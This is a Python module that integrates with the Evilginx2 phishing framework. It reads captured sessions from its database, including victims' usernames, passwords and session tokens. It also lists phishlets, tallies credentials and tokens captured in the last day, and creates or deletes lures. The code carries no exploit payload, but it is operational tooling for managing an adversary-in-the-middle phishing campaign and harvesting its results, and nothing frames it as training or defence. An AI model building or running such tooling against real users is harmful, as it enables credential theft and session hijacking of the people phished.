"""Evilginx2 integration module.

Reads sessions and configuration directly from the Evilginx2 data directory
(mounted via Docker volume).  Evilginx has no REST API — all state lives in
a SQLite database (data.db) and YAML config files.

Expected volume layout (evilginx_data:/app):
    /app/data.db          – SQLite sessions database
    /app/config.json      – runtime config (domain, IP, phishlets state)
    /app/phishlets/*.yaml – phishlet definitions
    /app/crt/             – auto-generated TLS certificates
"""

import glob
import json
import os
import sqlite3
import tempfile
import time
from pathlib import Path

import yaml

# ── Paths ──
EVILGINX_DATA = os.getenv("EVILGINX_DATA_DIR", "/app/evilginx")
EVILGINX_URL = os.getenv("EVILGINX_URL", "http://evilginx:443")

_DB_PATH = os.path.join(EVILGINX_DATA, "data.db")
_CONFIG_PATH = os.path.join(EVILGINX_DATA, "config.json")
_PHISHLETS_DIR = os.path.join(EVILGINX_DATA, "phishlets")


# ═══════════════════════════════════════════════════════════════
#  AVAILABILITY CHECK
# ═══════════════════════════════════════════════════════════════

def is_available() -> bool:
    """Check if Evilginx data directory and database are accessible."""
    return os.path.isfile(_DB_PATH)


# ═══════════════════════════════════════════════════════════════
#  SESSIONS
# ═══════════════════════════════════════════════════════════════

def _parse_json_field(raw):
    """Safely parse a JSON-serialized SQLite column."""
    if not raw:
        return {}
    try:
        return json.loads(raw)
    except (json.JSONDecodeError, TypeError):
        return {}


def get_sessions() -> list[dict]:
    """Return all captured sessions from the Evilginx database."""
    if not is_available():
        return []

    sessions = []
    try:
        conn = sqlite3.connect(_DB_PATH, timeout=5)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("SELECT * FROM sessions ORDER BY update_time DESC")
        for row in cur.fetchall():
            sessions.append({
                "id": row["id"],
                "phishlet": row["phishlet"],
                "landing_url": row["landing_url"],
                "username": row["username"],
                "password": row["password"],
                "session_id": row["session_id"],
                "useragent": row["useragent"],
                "remote_addr": row["remote_addr"],
                "create_time": row["create_time"],
                "update_time": row["update_time"],
                "tokens": _parse_json_field(row["tokens"]),
                "custom": _parse_json_field(row["custom"]),
            })
        conn.close()
    except (sqlite3.Error, KeyError):
        pass

    return sessions


def get_session(session_id: str) -> dict | None:
    """Return a single session by its session_id."""
    if not is_available():
        return None

    try:
        conn = sqlite3.connect(_DB_PATH, timeout=5)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
        row = cur.fetchone()
        conn.close()
        if not row:
            return None
        return {
            "id": row["id"],
            "phishlet": row["phishlet"],
            "landing_url": row["landing_url"],
            "username": row["username"],
            "password": row["password"],
            "session_id": row["session_id"],
            "useragent": row["useragent"],
            "remote_addr": row["remote_addr"],
            "create_time": row["create_time"],
            "update_time": row["update_time"],
            "tokens": _parse_json_field(row["tokens"]),
            "custom": _parse_json_field(row["custom"]),
        }
    except (sqlite3.Error, KeyError):
        return None


def delete_session(session_id: str) -> bool:
    """Delete a session by session_id. Returns True if deleted."""
    if not is_available():
        return False
    try:
        conn = sqlite3.connect(_DB_PATH, timeout=5)
        cur = conn.cursor()
        cur.execute("DELETE FROM sessions WHERE session_id = ?", (session_id,))
        deleted = cur.rowcount > 0
        conn.commit()
        conn.close()
        return deleted
    except sqlite3.Error:
        return False


# ═══════════════════════════════════════════════════════════════
#  PHISHLETS
# ═══════════════════════════════════════════════════════════════

def list_phishlets() -> list[dict]:
    """List all available phishlet YAML files with parsed metadata."""
    phishlets = []
    pattern = os.path.join(_PHISHLETS_DIR, "*.yaml")
    for path in sorted(glob.glob(pattern)):
        name = Path(path).stem
        try:
            with open(path) as f:
                data = yaml.safe_load(f) or {}
            phishlets.append({
                "name": name,
                "author": data.get("author", ""),
                "min_ver": data.get("min_ver", ""),
                "proxy_hosts": [h.get("phish_sub", "") + "." + h.get("domain", "")
                                for h in data.get("proxy_hosts", [])],
                "credentials": [c.get("name", "") for c in data.get("credentials", {}).get("username", [])
                                ] if isinstance(data.get("credentials"), dict) else [],
            })
        except (yaml.YAMLError, OSError):
            phishlets.append({"name": name, "error": "parse_failed"})
    return phishlets


def get_phishlet(name: str) -> dict | None:
    """Read and return the full parsed phishlet YAML."""
    path = os.path.join(_PHISHLETS_DIR, f"{name}.yaml")
    if not os.path.isfile(path):
        return None
    try:
        with open(path) as f:
            return yaml.safe_load(f)
    except (yaml.YAMLError, OSError):
        return None


# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

def get_config() -> dict:
    """Read Evilginx runtime config (domain, IP, active phishlets)."""
    if not os.path.isfile(_CONFIG_PATH):
        return {}
    try:
        with open(_CONFIG_PATH) as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return {}


# ═══════════════════════════════════════════════════════════════
#  STATS / SUMMARY
# ═══════════════════════════════════════════════════════════════

def get_stats() -> dict:
    """Aggregate stats across all sessions."""
    sessions = get_sessions()
    now = int(time.time())

    creds_captured = sum(1 for s in sessions if s.get("username"))
    tokens_captured = sum(1 for s in sessions if s.get("tokens"))
    phishlets_used = list({s["phishlet"] for s in sessions if s.get("phishlet")})

    recent_24h = [s for s in sessions if now - (s.get("update_time") or 0) < 86400]

    return {
        "total_sessions": len(sessions),
        "credentials_captured": creds_captured,
        "tokens_captured": tokens_captured,
        "phishlets_used": phishlets_used,
        "sessions_last_24h": len(recent_24h),
        "available": is_available(),
    }


# ═══════════════════════════════════════════════════════════════
#  CREDENTIALS
# ═══════════════════════════════════════════════════════════════

def get_credentials() -> list[dict]:
    """Return sessions that have captured username or password, sorted by create_time DESC."""
    if not is_available():
        return []

    results = []
    try:
        conn = sqlite3.connect(_DB_PATH, timeout=5)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute(
            "SELECT * FROM sessions WHERE username != '' OR password != '' ORDER BY create_time DESC"
        )
        for row in cur.fetchall():
            tokens = _parse_json_field(row["tokens"])
            results.append({
                "session_id": row["session_id"],
                "phishlet": row["phishlet"],
                "username": row["username"],
                "password": row["password"],
                "tokens_count": len(tokens) if isinstance(tokens, dict) else 0,
                "remote_addr": row["remote_addr"],
                "landing_url": row["landing_url"],
                "create_time": row["create_time"],
            })
        conn.close()
    except (sqlite3.Error, KeyError):
        pass

    return results


# ═══════════════════════════════════════════════════════════════
#  LURES
# ═══════════════════════════════════════════════════════════════

def _read_config() -> dict:
    """Read and return config.json contents."""
    if not os.path.isfile(_CONFIG_PATH):
        return {}
    try:
        with open(_CONFIG_PATH) as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return {}


def _write_config(config: dict) -> None:
    """Atomic write of config.json via tmp file + rename."""
    dir_path = os.path.dirname(_CONFIG_PATH)
    fd, tmp_path = tempfile.mkstemp(dir=dir_path, suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as f:
            json.dump(config, f, indent=2)
        os.replace(tmp_path, _CONFIG_PATH)
    except Exception:
        if os.path.exists(tmp_path):
            os.unlink(tmp_path)
        raise


def get_lures() -> list[dict]:
    """Return list of lures from config.json."""
    config = _read_config()
    lures = config.get("lures", [])
    if not isinstance(lures, list):
        return []
    return lures


def create_lure(phishlet: str, redirect_url: str = "", path: str = "") -> dict:
    """Create a new lure for a given phishlet.

    Raises FileNotFoundError if config.json doesn't exist.
    Raises ValueError if phishlet doesn't exist in phishlets dir.
    """
    if not os.path.isfile(_CONFIG_PATH):
        raise FileNotFoundError("config.json not found")

    # Validate phishlet exists
    phishlet_path = os.path.join(_PHISHLETS_DIR, f"{phishlet}.yaml")
    if not os.path.isfile(phishlet_path):
        raise ValueError(f"Phishlet '{phishlet}' not found")

    config = _read_config()
    lures = config.get("lures", [])
    if not isinstance(lures, list):
        lures = []

    # Generate next ID
    max_id = max((l.get("id", 0) for l in lures), default=0)
    new_id = max_id + 1

    lure = {
        "id": new_id,
        "phishlet": phishlet,
        "path": path,
        "redirect_url": redirect_url,
        "paused": False,
        "og_title": "",
        "og_desc": "",
    }
    lures.append(lure)
    config["lures"] = lures
    _write_config(config)

    return lure


def delete_lure(lure_id: int) -> bool:
    """Delete a lure by its ID. Returns True if found and deleted."""
    config = _read_config()
    lures = config.get("lures", [])
    if not isinstance(lures, list):
        return False

    original_len = len(lures)
    lures = [l for l in lures if l.get("id") != lure_id]

    if len(lures) == original_len:
        return False

    config["lures"] = lures
    _write_config(config)
    return True


# ═══════════════════════════════════════════════════════════════
#  STATUS (combined)
# ═══════════════════════════════════════════════════════════════

def get_status() -> dict:
    """Return combined Evilginx status: availability, config, stats, lures."""
    available = is_available()
    config = get_config()
    stats = get_stats()
    lures = get_lures()
    phishlets = list_phishlets()

    # Active phishlets from config
    cfg_phishlets = config.get("phishlets", {})
    active = [name for name, state in cfg_phishlets.items()
              if isinstance(state, str) and state.lower() in ("enabled", "active")]

    return {
        "available": available,
        "domain": config.get("domain", ""),
        "ip": config.get("ip", ""),
        "active_phishlets": active,
        "total_sessions": stats.get("total_sessions", 0),
        "credentials_captured": stats.get("credentials_captured", 0),
        "tokens_captured": stats.get("tokens_captured", 0),
        "sessions_last_24h": stats.get("sessions_last_24h", 0),
        "phishlets_count": len(phishlets),
        "lures_count": len(lures),
    }
